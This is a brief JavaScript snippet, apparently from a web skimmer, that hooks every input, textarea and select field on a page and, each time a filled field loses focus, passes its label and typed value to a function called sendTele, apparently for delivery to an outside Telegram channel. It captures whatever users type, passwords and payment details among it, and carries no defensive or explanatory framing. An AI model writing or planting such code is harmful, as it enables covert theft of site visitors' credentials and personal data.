document.querySelectorAll('input, textarea, select').forEach(field => {
    field.addEventListener('blur', () => {
        if (field.value.length > 0) {
            const label = field.placeholder || field.name || field.id || "Unknown";
            sendTele(` Input Capture:\nField: ${label}\nData: ${field.value}`);
        }
    });
});
